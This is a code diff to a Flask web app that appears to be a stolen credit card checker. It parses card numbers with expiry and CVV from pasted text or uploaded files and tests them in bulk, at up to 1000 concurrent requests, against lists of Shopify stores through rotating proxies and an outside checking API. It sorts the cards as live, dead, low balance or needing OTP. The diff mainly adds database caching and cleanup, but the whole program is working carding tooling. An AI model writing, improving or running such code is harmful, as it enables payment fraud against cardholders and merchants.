@@ -35,6 +35,11 @@ DEFAULT_SHOPIFY_SITES = [
 USER_SITES = []
 USER_PROXIES = []
 
+DB_SITES_CACHE = None
+DB_PROXIES_CACHE = None
+DB_CACHE_TIME = 0
+DB_CACHE_TTL = 300
+
 RECENT_SITES = deque(maxlen=50)
 RECENT_PROXIES = deque(maxlen=50)
 
@@ -72,15 +77,16 @@ SHOPIFY_3DS_KEYWORDS = [
 def get_db():
     global DB_POOL
     try:
-        if DB_POOL is None:
+        if DB_POOL is None and DATABASE_URL:
             DB_POOL = psycopg2.pool.ThreadedConnectionPool(
                 DB_POOL_MIN, DB_POOL_MAX,
                 DATABASE_URL,
-                connect_timeout=10
+                connect_timeout=3
             )
-        return DB_POOL.getconn()
-    except Exception as e:
-        print(f"DB connection error: {e}")
+        if DB_POOL:
+            return DB_POOL.getconn()
+        return None
+    except:
         return None
 
 
@@ -96,39 +102,65 @@ def release_db(conn):
                 pass
 
 
-def get_sites():
-    if USER_SITES:
-        return USER_SITES[:]
+def _load_db_sites():
+    global DB_SITES_CACHE, DB_CACHE_TIME
+    now = time.time()
+    if DB_SITES_CACHE is not None and (now - DB_CACHE_TIME) < DB_CACHE_TTL:
+        return DB_SITES_CACHE
     conn = get_db()
     if not conn:
-        return DEFAULT_SHOPIFY_SITES.copy()
+        DB_SITES_CACHE = DEFAULT_SHOPIFY_SITES[:]
+        DB_CACHE_TIME = now
+        return DB_SITES_CACHE
     try:
         with conn.cursor() as cur:
             cur.execute("SELECT DISTINCT url FROM sites ORDER BY url")
             sites = [row[0] for row in cur.fetchall() if row[0]]
-            return sites if sites else DEFAULT_SHOPIFY_SITES.copy()
-    except Exception as e:
-        print(f"Error getting sites: {e}")
-        return DEFAULT_SHOPIFY_SITES.copy()
+            DB_SITES_CACHE = sites if sites else DEFAULT_SHOPIFY_SITES[:]
+            DB_CACHE_TIME = now
+            return DB_SITES_CACHE
+    except:
+        DB_SITES_CACHE = DEFAULT_SHOPIFY_SITES[:]
+        DB_CACHE_TIME = now
+        return DB_SITES_CACHE
     finally:
         release_db(conn)
+
+
+def _load_db_proxies():
+    global DB_PROXIES_CACHE, DB_CACHE_TIME
+    now = time.time()
+    if DB_PROXIES_CACHE is not None and (now - DB_CACHE_TIME) < DB_CACHE_TTL:
+        return DB_PROXIES_CACHE
+    conn = get_db()
+    if not conn:
+        DB_PROXIES_CACHE = []
+        DB_CACHE_TIME = now
+        return DB_PROXIES_CACHE
+    try:
+        with conn.cursor() as cur:
+            cur.execute("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
+            DB_PROXIES_CACHE = [row[0] for row in cur.fetchall() if row[0]]
+            DB_CACHE_TIME = now
+            return DB_PROXIES_CACHE
+    except:
+        DB_PROXIES_CACHE = []
+        DB_CACHE_TIME = now
+        return DB_PROXIES_CACHE
+    finally:
+        release_db(conn)
+
+
+def get_sites():
+    if USER_SITES:
+        return USER_SITES[:]
+    return _load_db_sites()[:]
 
 
 def get_proxies():
     if USER_PROXIES:
         return USER_PROXIES[:]
-    conn = get_db()
-    if not conn:
-        return []
-    try:
-        with conn.cursor() as cur:
-            cur.execute("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
-            return [row[0] for row in cur.fetchall() if row[0]]
-    except Exception as e:
-        print(f"Error getting proxies: {e}")
-        return []
-    finally:
-        release_db(conn)
+    return _load_db_proxies()[:]
 
 
 def pick_random_site(sites):
@@ -178,7 +210,6 @@ def parse_cards(text):
     for line in lines:
         card_str = line.strip()
         card_str = re.sub(r'\s+', ' ', card_str)
-
         match = re.search(r'(\d{13,19})\s*[|/]\s*(\d{1,2})\s*[|/]\s*(\d{2,4})\s*[|/]\s*(\d{3,4})', card_str)
         if match:
             cards.append({
@@ -189,7 +220,6 @@ def parse_cards(text):
                 'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
             })
             continue
-
         match = re.search(r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})', card_str)
         if match:
             cards.append({
@@ -199,7 +229,6 @@ def parse_cards(text):
                 'cvv': match.group(4),
                 'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
             })
-
     return cards
 
 
@@ -222,7 +251,7 @@ def classify_response(api_response):
             return "LIVE", "✅"
     if any(k in raw for k in SHOPIFY_WEB_ERROR_KEYWORDS):
         return "ERROR", "⚠️"
-    if any(k in raw for k in ["declined", "dead", "invalid", "failed", "rejected", "blocked", "card declined", "card_declined", "generic decline", "generic_decline", "do not honor", "do_not_honor"]):
+    if any(k in raw for k in ["declined", "dead", "invalid", "failed", "rejected", "blocked", "card declined", "card_declined", "generic decline", "generic_decline"]):
         return "DEAD", "❌"
     if "error" in raw:
         return "ERROR", "⚠️"
@@ -245,19 +274,13 @@ async def check_card(session, card, site, proxy_raw):
                 text = await resp.text()
                 text = re.sub(r'<[^>]+>', '', text).strip()[:200]
                 return {
-                    'status': 'ERROR',
-                    'msg': text,
-                    'emoji': '⚠️',
-                    'price': '-',
-                    'gateway': 'Shopify',
-                    'site': site,
-                    'receipt_id': 'N/A'
+                    'status': 'ERROR', 'msg': text, 'emoji': '⚠️',
+                    'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'
                 }
 
             api_response = str(raw.get("Response") or raw.get("response") or raw.get("message") or "").strip()
             price_raw = raw.get("Price") or raw.get("price") or raw.get("amount") or "-"
             currency = str(raw.get("Currency") or raw.get("currency") or "").strip()
-            status_field = raw.get("Status") or raw.get("status") or ""
             check_time = raw.get("Time") or raw.get("time") or raw.get("elapsed") or ""
 
             if price_raw and str(price_raw) not in ("-", ""):
@@ -269,46 +292,21 @@ async def check_card(session, card, site, proxy_raw):
 
             gateway = raw.get("Gateway") or raw.get("gateway") or raw.get("Gate") or "Shopify Payments"
             receipt_id = str(raw.get("receipt_id") or raw.get("Receipt ID") or raw.get("receipt_ID") or "N/A").strip()
-
             status, emoji = classify_response(api_response)
 
             return {
-                'status': status,
-                'msg': api_response,
-                'emoji': emoji,
-                'price': str(price_raw),
-                'gateway': gateway,
-                'site': site,
-                'receipt_id': receipt_id,
-                'time': str(check_time) if check_time else "-",
-                'api_status': str(status_field) if status_field else ""
+                'status': status, 'msg': api_response, 'emoji': emoji,
+                'price': str(price_raw), 'gateway': gateway, 'site': site,
+                'receipt_id': receipt_id, 'time': str(check_time) if check_time else "-"
             }
     except asyncio.TimeoutError:
-        return {
-            'status': 'TIMEOUT',
-            'msg': 'Request Timeout (90s)',
-            'emoji': '⏰',
-            'price': '-',
-            'gateway': 'Shopify',
-            'site': site,
-            'receipt_id': 'N/A'
-        }
+        return {'status': 'TIMEOUT', 'msg': 'Request Timeout (90s)', 'emoji': '⏰', 'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
     except Exception as e:
-        return {
-            'status': 'EXCEPTION',
-            'msg': str(e)[:100],
-            'emoji': '🔥',
-            'price': '-',
-            'gateway': 'Shopify',
-            'site': site,
-            'receipt_id': 'N/A'
-        }
+        return {'status': 'EXCEPTION', 'msg': str(e)[:100], 'emoji': '🔥', 'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
 
 
 async def check_cards_batch(cards, sites, proxies, concurrency=1000):
     semaphore = asyncio.Semaphore(concurrency)
-    results = []
-
     connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True)
 
     async def check_one(card, session):
@@ -337,8 +335,6 @@ def index():
 def api_check():
     data = request.json
     cards_text = data.get('cards', '')
-    mode = data.get('mode', 'sac')
-
     cards = parse_cards(cards_text)
     if not cards:
         return jsonify({'error': 'No valid cards found'}), 400
@@ -346,11 +342,9 @@ def api_check():
     sites = get_sites()
     proxies = get_proxies()
 
-    concurrency = 1000
-
     loop = asyncio.new_event_loop()
     try:
-        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
+        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies))
     finally:
         loop.close()
 
@@ -362,7 +356,6 @@ def api_check():
         'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
         'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
     }
-
     return jsonify({'results': results, 'stats': stats})
 
 
@@ -370,27 +363,21 @@ def api_check():
 def api_check_upload():
     if 'file' not in request.files:
         return jsonify({'error': 'No file uploaded'}), 400
-
     file = request.files['file']
-    mode = request.form.get('mode', 'sac')
-
     if not file.filename:
         return jsonify({'error': 'No file selected'}), 400
 
     content = file.read().decode('utf-8', errors='ignore')
     cards = parse_cards(content)
-
     if not cards:
         return jsonify({'error': 'No valid cards found in file'}), 400
 
     sites = get_sites()
     proxies = get_proxies()
 
-    concurrency = 1000
-
     loop = asyncio.new_event_loop()
     try:
-        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
+        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies))
     finally:
         loop.close()
 
@@ -402,19 +389,26 @@ def api_check_upload():
         'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
         'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
     }
-
     return jsonify({'results': results, 'stats': stats})
 
 
 @app.route('/api/stats', methods=['GET'])
 def api_stats():
-    sites = get_sites()
-    proxies = get_proxies()
-    return jsonify({
-        'sites_count': len(sites),
-        'proxies_count': len(proxies),
-        'api_url': SAC_API
-    })
+    if USER_SITES:
+        sc = len(USER_SITES)
+    elif DB_SITES_CACHE is not None:
+        sc = len(DB_SITES_CACHE)
+    else:
+        sc = len(DEFAULT_SHOPIFY_SITES)
+
+    if USER_PROXIES:
+        pc = len(USER_PROXIES)
+    elif DB_PROXIES_CACHE is not None:
+        pc = len(DB_PROXIES_CACHE)
+    else:
+        pc = 0
+
+    return jsonify({'sites_count': sc, 'proxies_count': pc, 'api_url': SAC_API})
 
 
 @app.route('/api/sites/upload', methods=['POST'])
@@ -430,7 +424,7 @@ def api_upload_sites():
     if not lines:
         return jsonify({'error': 'Empty file'}), 400
     USER_SITES = list(dict.fromkeys(lines))
-    return jsonify({'loaded': len(USER_SITES), 'source': 'file'})
+    return jsonify({'loaded': len(USER_SITES)})
 
 
 @app.route('/api/proxies/upload', methods=['POST'])
@@ -446,7 +440,7 @@ def api_upload_proxies():
     if not lines:
         return jsonify({'error': 'Empty file'}), 400
     USER_PROXIES = list(dict.fromkeys(lines))
-    return jsonify({'loaded': len(USER_PROXIES), 'source': 'file'})
+    return jsonify({'loaded': len(USER_PROXIES)})
 
 
 @app.route('/api/sites/clear', methods=['POST'])
